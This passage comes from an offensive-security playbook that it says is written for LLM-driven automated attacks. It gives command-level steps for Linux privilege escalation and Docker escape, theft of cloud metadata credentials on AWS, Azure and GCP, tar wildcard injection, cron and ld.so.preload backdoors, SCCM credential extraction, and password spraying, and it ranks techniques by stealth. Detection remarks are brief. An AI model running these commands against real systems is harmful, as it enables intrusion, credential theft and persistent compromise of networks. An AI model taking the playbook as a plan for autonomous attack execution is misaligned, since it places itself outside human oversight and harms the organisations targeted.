**Kernel exploits:** DirtyPipe (CVE-2022-0847, Linux 5.8–5.16.11), DirtyCow (CVE-2016-5195, <4.8.3). Check: `uname -r` + `linux-exploit-suggester-2.pl`.

**Docker escape:** `ls /.dockerenv` (detect container). Mounted socket: `docker run -v /:/host --privileged -it ubuntu chroot /host bash`. Privileged container: cgroup release_agent escape or `nsenter --target 1 --mount --uts --ipc --net --pid -- bash`.

**NFS no_root_squash:** `showmount -e target` → mount share → create SUID binary → execute on target.

**Wildcard injection:** `echo "" > "--checkpoint=1"; echo "" > "--checkpoint-action=exec=sh shell.sh"` in directory where cron runs `tar czf backup.tar.gz *`.

---

## Skill 23 — AWS enumeration and exploitation

```bash
# SSRF to metadata (OPSEC: 0.2 from app context)
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
# IMDSv2 (harder via SSRF — requires PUT):
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" http://169.254.169.254/...

# enumerate-iam (OPSEC: 0.8 — many API calls)
python enumerate-iam.py --access-key AKIA... --secret-key SECRET

# Pacu framework
Pacu> import_keys --all
Pacu> run iam__enum_users_roles_policies_groups
Pacu> run iam__privesc_scan

# S3 bucket enumeration
aws s3 ls s3://bucket --no-sign-request    # Anonymous access test

# Prowler security assessment (OPSEC: 0.8)
prowler aws --severity critical
```

**Detection:** CloudTrail logs all API calls. GuardDuty detects credential exfiltration, unusual API patterns. **93% of EC2 instances still don't enforce IMDSv2**.

---

## Skill 24 — Azure enumeration and exploitation

```bash
# ROADtools (OPSEC: 0.5 — legitimate Graph API)
roadrecon auth -u user@dom.com -p pass
roadrecon gather; roadrecon gui

# AzureHound (OPSEC: 0.5 — detectable user-agent)
./azurehound -u user@dom.com -p pass list --tenant dom.com -o output.json

# Managed identity token theft
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' -H Metadata:true

# Az CLI enumeration
az ad user list; az ad group list; az role assignment list --all; az vm list
```

**Detection:** Splunk detection rules for AzureHound user-agent, Microsoft Graph Activity Logs for enumeration spikes. Used by APT groups: Peach Sandstorm, Void Blizzard, Storm-0501.

---

## Skill 25 — GCP enumeration

```bash
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
gcloud iam service-accounts list
gcloud projects get-iam-policy <project-id>
gcloud compute instances list; gcloud storage ls
```

---

## Skill 26 — Data discovery and exfiltration

```bash
# Snaffler — automated share enumeration (OPSEC: 0.5)
Snaffler.exe -s -o snaffler.log
Snaffler.exe -s -d domain.local -o snaffler.log -v data
# Finds: passwords in scripts/configs, SSH keys, KeePass DBs, certificates, connection strings

# Seatbelt — local host enumeration (OPSEC: 0.2)
Seatbelt.exe -group=all
```

**Graph:** `credential` nodes from discovered passwords, `share` nodes with sensitive file indicators. Link credentials to users and services.

---

## Skill 27 — Persistence mechanisms

**Windows persistence (by stealth):**

| Technique | OPSEC | Detection |
|---|---|---|
| WMI Event Subscriptions | 0.2 | Sysmon 19-21, Event 5861 |
| COM Hijacking | 0.2 | Sysmon 12/13 HKCU CLSID |
| DLL Hijacking | 0.2 | Sysmon 7 unsigned DLL load |
| BITS Jobs | 0.3 | bitsadmin /list, Event 59-61 |
| Scheduled Tasks | 0.5 | Event 106/4698 |
| Services | 0.5 | Event 7045 |
| Registry Run Keys | 0.7 | Sysmon 12/13, Autoruns |

**Linux persistence:** Cron (`echo "* * * * * /tmp/shell" >> /var/spool/cron/root`), systemd service (`/etc/systemd/system/backdoor.service`), SSH authorized_keys, `.bashrc` injection, PAM backdoor (modify pam_unix.so), LD_PRELOAD (`echo "/tmp/evil.so" > /etc/ld.so.preload`).

---

## Skill 28 — SCCM/MECM attacks

```bash
# SharpSCCM enumeration
SharpSCCM.exe local site-info          # Get site code and management point
SharpSCCM.exe local secrets -m disk    # Extract NAA credentials (cleartext!)

# SCCMHunter (Python cross-platform)
python3 sccmhunter.py find -u user -p pass -d dom -dc-ip DC

# PXE boot credential theft
python3 pxethief.py 1

# CMLoot — SCCMContentLib$ share enumeration
python cmloot.py domain/user:pass@ip -cmlootdownload files.txt
```

NAA (Network Access Account) credentials are stored in **cleartext** on SCCM clients and provide domain-level access. **OPSEC: 0.5**. Detection: LDAP wildcards for `*sccm*`, Event 4624 LogonType 9.

---

## Skill 29 — Exchange/mail attacks

**ProxyLogon (CVE-2021-26855+27065):** Pre-auth RCE via SSRF → admin impersonation → webshell write. Detection: `Set-OabVirtualDirectory` in MSExchange Management.evtx, webshells in ECP/OWA paths.

**ProxyShell (CVE-2021-34473+34523+31207):** Pre-auth RCE via path confusion → PowerShell backend → mailbox export → webshell. Detection: `New-MailboxExportRequest` in management logs, autodiscover.json anomalous requests.

```bash
# OWA brute force
ruler --email user@target.com --password pass brute

# Global Address List extraction (post-auth)
# Via OWA/EWS or MAPI: enumerate all mailboxes and contacts
```

**Graph:** `host(Exchange)` → `service(OWA/443)`, `ADMIN_TO` from Exchange server SYSTEM → often has DCSync via inherited permissions.

---

## Skill 30 — Password spraying methodology

**The complete spray workflow:**

1. **Enumerate usernames:** kerbrute userenum (OPSEC: 0.3, no lockout), LDAP query, OWA timing attacks, `/wp-json/wp/v2/users`, SMTP VRFY
2. **Get password policy:** `nxc smb DC -u user -p pass --pass-pol` — note lockout threshold and observation window
3. **Calculate safe interval:** If 5 attempts/30 min lockout → spray **1 password**, wait **31 minutes**, repeat
4. **Spray:** `kerbrute passwordspray -d dom --dc DC users.txt 'Spring2025!'` (Kerberos preferred — no 4625 events)
5. **Validate hits:** `nxc smb DC -u validuser -p validpass --shares` (confirm access level)

**Common password patterns:** Season+Year+Symbol (Spring2025!), CompanyName+Year, Welcome1, Password1, Changeme1, Monday1!

**Graph:** `credential(valid_combo)` → `VALID_ON` → `user` → check `ADMIN_TO` edges with `nxc smb targets -u user -p pass --continue-on-success`.

---

## Graph integration reference

Every skill maps findings to the property graph. Here is the complete edge type reference:

| Edge Type | Created By | Meaning |
|---|---|---|
| `REACHABLE` | Network recon, pivoting | Network path exists |
| `RUNS` | Port scan | Host runs service |
| `MEMBER_OF` | AD discovery | User/computer in group |
| `MEMBER_OF_DOMAIN` | AD discovery | Entity belongs to domain |
| `ADMIN_TO` | Lateral movement, relay | Admin access confirmed |
| `HAS_SESSION` | BloodHound, lateral movement | Active logon session |
| `VALID_ON` | Credential attacks | Credential authenticates entity |
| `CAN_DCSYNC` | ACL abuse, relay | Has replication rights |
| `DELEGATES_TO` | AD discovery | Constrained delegation target |
| `RELAY_TARGET` | SMB signing check | NTLM relay viable |
| `ESC1`–`ESC8` | ADCS enumeration | Certificate template vulnerability |
| `TRUSTS` | Trust enumeration | Domain trust relationship |
| `GENERIC_ALL` | BloodHound ACL | Full control on object |
| `WRITE_DACL` | BloodHound ACL | Can modify permissions |
| `WRITE_OWNER` | BloodHound ACL | Can take ownership |
| `FORCE_CHANGE_PASSWORD` | BloodHound ACL | Can reset password |
| `ADD_MEMBER` | BloodHound ACL | Can add group members |

## Sequencing and dependency map

The optimal skill execution order follows this dependency chain:

**Phase 1 — Reconnaissance:** Network Recon (Skill 1) → DNS Enum (2) → SMB Enum (4) → SNMP Enum (3) + Web Recon (16)

**Phase 2 — AD Enumeration:** AD Discovery (5) → BloodHound import → identify attack paths

**Phase 3 — Initial Access:** Password Spraying (30) → Credential validation → Web Vuln Scanning (17) → SQL Injection (18) → Web Attacks (19) → CMS Exploitation (20)

**Phase 4 — Credential Attacks:** Kerberoasting/AS-REP (6) → NTLM Relay (13) → Credential Dumping (11)

**Phase 5 — Privilege Escalation:** AD PrivEsc via ACL abuse (8) → ADCS Exploitation (7) → Linux PrivEsc (22) → Cloud exploitation (23-25)

**Phase 6 — Lateral Movement:** Lateral Movement (14) → Pivoting (15) → repeat Phases 2-5 in new network segments

**Phase 7 — Objectives:** Data Discovery (26) → Domain Trust Attacks (10) → AD Persistence (9) → Persistence Mechanisms (27)

## Conclusion

This playbook library provides the **command-level specificity** required for LLM-driven execution across all 30 offensive security domains. Three architectural decisions are critical for the framework's effectiveness. First, **graph-first reporting** — every technique must output structured node/edge data before prose findings, because the engagement state graph drives automated attack path selection. Second, **OPSEC-aware sequencing** — the framework should always prefer lower-noise techniques (WinRM over PsExec, Kerberos spray over SMB spray, Ligolo-ng over chisel) and escalate noise only when quieter methods fail. Third, **dependency-chain enforcement** — skills like RBCD require machine account creation (MAQ > 0) and write access to msDS-AllowedToActOnBehalfOfOtherIdentity, so the graph must track these prerequisites as edge conditions rather than assuming them. The most impactful attack paths in modern AD environments typically flow through ADCS (ESC1/ESC8 → domain admin in two commands), NTLM relay chains (PetitPotam → LDAP → RBCD), and ACL abuse paths visible only through BloodHound collection — making Skills 5, 7, 8, and 13 the highest-priority implementations.